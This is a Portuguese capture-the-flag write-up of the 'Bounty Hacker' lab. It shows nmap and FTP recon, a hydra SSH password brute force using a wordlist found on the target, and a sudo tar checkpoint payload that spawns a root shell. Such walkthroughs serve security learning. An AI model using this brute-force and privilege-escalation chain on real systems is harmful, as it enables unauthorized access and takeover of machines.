# Bounty Hacker
Você se gabou muito de ser o hacker mais elitista do sistema solar. Prove e reivindique seu direito ao título de Hacker de Recompensas de Elite!
## Recon
Após receber o endereço IP ja fiz um ping test e verifiquei se a aplicaçoes web:
```Bash
ping 10.201.90.238
PING 10.201.90.238 (10.201.90.238) 56(84) bytes of data.
64 bytes from 10.201.90.238: icmp_seq=1 ttl=62 time=218 ms
64 bytes from 10.201.90.238: icmp_seq=2 ttl=62 time=224 ms
^C
--- 10.201.90.238 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 218.431/221.084/223.738/2.653 ms

$curl 10.201.90.238
<html>

<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>
```
Ip ok, app web ok. Irei deixar o nmap rodando enquanto entro na aplicação web:
```BASH
$IP=10.201.90.238
$nmap $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-16 21:01 -03
Nmap scan report for 10.201.90.238
Host is up (0.21s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```
Temos alguns serviços e alguns possiveis nomes de usuarios.

Começarei pelo mais obvio: ftp + login anonimo:

```BASH
ftp anonymous@$IP
Connected to 10.201.90.238.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt & get task.txt
```
Dois arquivos. O arquivo task tem o nome do autor, provavelmente e um nome de usuario. Já o arquivo locks tem uma wordlist de possiveis senhas. Tudo indica um brute force e o nosso passo para o acesso inicial.
## Intial Acess
Com uma lista de palavras e o posivel username fica simples.
```BASH
$hydra -l <USERNAME> -P <PATH_TO_WORDLIST> $IP ssh
```
depois e so fazer o login ssh:
```BASH
$ssh <USERNAME>@$IP
```
## Priv escalation
aqui foi simples e nao gastei nenhuma energia. `sudo -l` ja mostrou o TAR. oque nos leva ao nosso querido [Gtfobins](https://gtfobins.github.io/gtfobins/tar/#shell).

Payload usada:
```BASH
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Com isso chegamos ao fim desse desafio. A baixo esta algumas lições que aprendi nesse desafio:

    Não tire ondas com os amigos em um bar
    Nunca duvide das capacidades de um CTF
    Atençao ao minimos detalhes, pois eles importam.
# Hack The World!

